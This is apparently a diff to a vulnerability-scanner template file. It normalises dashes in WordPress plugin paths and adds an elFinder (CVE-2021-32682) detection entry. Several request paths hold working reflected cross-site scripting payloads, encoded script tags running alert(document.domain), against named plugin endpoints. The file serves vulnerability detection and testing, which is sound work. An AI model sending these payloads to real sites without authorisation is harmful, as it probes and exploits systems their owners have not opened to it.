@@ -3098,7 +3098,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/import–legacy–media/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/import-legacy-media/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -3143,7 +3143,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/podcast–channels/getid3/demos/demo.write.php?Filename=Filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&"
+            "{{BaseURL}}/wp-content/plugins/podcast-channels/getid3/demos/demo.write.php?Filename=Filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&"
           ]
         }
       ]
@@ -3158,7 +3158,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/shortcode–ninja/preview-shortcode-external.php?shortcode=shortcode%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3e"
+            "{{BaseURL}}/wp-content/plugins/shortcode-ninja/preview-shortcode-external.php?shortcode=shortcode%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3e"
           ]
         }
       ]
@@ -3173,7 +3173,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/swipehq–payment–gateway–woocommerce/test-plugin.php?api_url=api_url%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E "
+            "{{BaseURL}}/wp-content/plugins/swipehq-payment-gateway-woocommerce/test-plugin.php?api_url=api_url%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E "
           ]
         }
       ]
@@ -3188,7 +3188,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/ultimate–weather–plugin/magpierss/scripts/magpie_debug.php?url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/ultimate-weather-plugin/magpierss/scripts/magpie_debug.php?url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -3203,7 +3203,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/wp–planet/rss.class/scripts/magpie_debug.php?url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/wp-planet/rss.class/scripts/magpie_debug.php?url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -5390,7 +5390,7 @@
     {
       "id": "CVE-2017-7391",
       "info": {
-        "name": "Magmi – Cross-Site Scripting v.0.7.22",
+        "name": "Magmi Cross-Site Scripting v.0.7.22",
         "severity": "medium"
       },
       "requests": [
@@ -13524,6 +13524,29 @@
       ]
     },
     {
+      "id": "CVE-2021-32682",
+      "info": {
+        "name": "elFinder - Multiple vulnerabilities leading to RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/admin/elfinder/elfinder-cke.html",
+            "{{BaseURL}}/assets/backend/elfinder/elfinder-cke.html",
+            "{{BaseURL}}/assets/elFinder-2.1.9/elfinder.html",
+            "{{BaseURL}}/assets/elFinder/elfinder.html",
+            "{{BaseURL}}/backend/elfinder/elfinder-cke.html",
+            "{{BaseURL}}/elfinder/elfinder-cke.html",
+            "{{BaseURL}}/uploads/assets/backend/elfinder/elfinder-cke.html",
+            "{{BaseURL}}/uploads/assets/backend/elfinder/elfinder.html",
+            "{{BaseURL}}/uploads/elfinder/elfinder-cke.html"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-32819",
       "info": {
         "name": "Nodejs squirrelly template engine RCE",
@@ -14334,7 +14357,7 @@
     {
       "id": "CVE-2021-40960",
       "info": {
-        "name": "Galera WebTemplate 1.0 – Directory Traversal",
+        "name": "Galera WebTemplate 1.0 Directory Traversal",
         "severity": "critical"
       },
       "requests": [
